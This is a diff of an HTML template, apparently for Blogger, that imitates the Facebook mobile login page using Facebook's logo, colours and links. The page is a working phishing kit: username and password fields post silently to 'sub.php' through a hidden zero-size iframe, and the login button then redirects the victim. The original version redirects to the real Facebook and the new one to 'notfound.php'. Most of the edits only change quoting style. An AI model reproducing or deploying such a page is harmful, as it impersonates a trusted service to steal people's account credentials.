@@ -1,10 +1,9 @@
 
-<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
-<meta content='width=device-width, initial-scale=1' name='viewport' user-scalable='0'/>
-<meta charset='UTF-8'/>
-<meta content='#3b5998' name='theme-color'/>
-<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
-<link href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='icon'/>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head><meta content="width=device-width, initial-scale=1" name="viewport" user-scalable="0">
+<meta charset="UTF-8">
+<meta content="#3b5998" name="theme-color">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<link href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" rel="icon">
 <style>
    .header {
       background: #3b5998;
@@ -73,9 +72,9 @@
         margin-top: 30px; }
 
 </style>
-<head>
-<link href='https://www.blogger.com/static/v1/widgets/14020288-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
-<style id='page-skin-1' type='text/css'><!--
+
+<link href="https://www.blogger.com/static/v1/widgets/14020288-widget_css_bundle.css" rel="stylesheet" type="text/css">
+<style id="page-skin-1" type="text/css"><!--
 /*
 body {
 font: $(body.font);
@@ -90,48 +89,49 @@ padding: 0;
 
 </head>
 <body>
-<div class='main no-items section' id='main'></div>
+<div class="main no-items section" id="main"></div>
 <!-- Please Keep The Credits -->
 <center>
-<div class='header' data-sigil='mChromeHeaderCenter'><a href='/'><img height='20' src='https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png' width='100'/></a></div>
+<div class="header" data-sigil="mChromeHeaderCenter"><a href="/"><img height="20" src="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png" width="100"></a></div>
 <login>
-<iframe border='0' height='0' name='hiddenFrame' style='display: none;' width='0'></iframe>
-<form action="sub.php" method="post" target='hiddenFrame'>
-<input name='username' placeholder='Phone or name' type='text'/>
-<br/>
-<input name='password' placeholder='password' type='password'/>
-<br/>
-<br/>
-<button id='pronto' onclick='window.open(&#39;https://www.facebook.com/?ref=tn_tnmn&#39;,"_self");' type='submit'>login</button>
-<br/>
-<br/>
+<iframe border="0" height="0" name="hiddenFrame" style="display: none;" width="0"></iframe>
+<form action="sub.php" method="post" target="hiddenFrame">
+<input name="username" placeholder="Phone or name" type="text">
+<br>
+<input name="password" placeholder="password" type="password">
+<br>
+<br>
+<button id="pronto" onclick="window.open(&quot;notfound.php&quot;);" type="submit">login</button>
+<br>
+<br>
 <p><span>or</span></p>
-<br/>
-<a href='https://facebook.com/r.php' style='padding: 12px;background:#00a400;border:none;box-shadow: none;border-radius:4px;border:none;color:white;margin:-10px;text-decoration: none;0 -1px 0 rgba(0, 0, 0, .35);font-weight: bold;'>Regester</a>
-<br/>
-<br/>
-<a href='https://facebook.com/recover/initiate/' style='color: #7596c8!important;text-decoration: none;font-size: 15px;' tabindex='0'>forgot password?</a>
-<div class='row'>
-<div class='column'>
-<p2>Português (Brasil)</p2><br/>
-<p1 href='/'>Español</p1><br/>
-<p1 href='/'>Deutsch</p1><br/>
-<p1 href='/'>العربية</p1><br/>
+<br>
+<a href="https://facebook.com/r.php" style="padding: 12px;background:#00a400;border:none;box-shadow: none;border-radius:4px;border:none;color:white;margin:-10px;text-decoration: none;0 -1px 0 rgba(0, 0, 0, .35);font-weight: bold;">Regester</a>
+<br>
+<br>
+<a href="https://facebook.com/recover/initiate/" style="color: #7596c8!important;text-decoration: none;font-size: 15px;" tabindex="0">forgot password?</a>
+<div class="row">
+<div class="column">
+<p2>Português (Brasil)</p2><br>
+<p1 href="/">Español</p1><br>
+<p1 href="/">Deutsch</p1><br>
+<p1 href="/">العربية</p1><br>
 </div>
-<div class='column'>
-<p1 href='/'>English (US)</p1><br/>
-<p1 href='/'>Français (France)</p1><br/>
-<p1 href='/'>Italiano</p1><br/>
+<div class="column">
+<p1 href="/">English (US)</p1><br>
+<p1 href="/">Français (France)</p1><br>
+<p1 href="/">Italiano</p1><br>
 </div>
 </div></form></login>
-<br/>
-<br/>
-<br/>
-<br/>
-<br/>
+<br>
+<br>
+<br>
+<br>
+<br>
 <p2>Facebook, Inc.</p2>
 </center>
-<div class='no-items section' id='main'></div>
-</body>
-</html>
+<div class="no-items section" id="main"></div>
 
+
+
+</body></html>
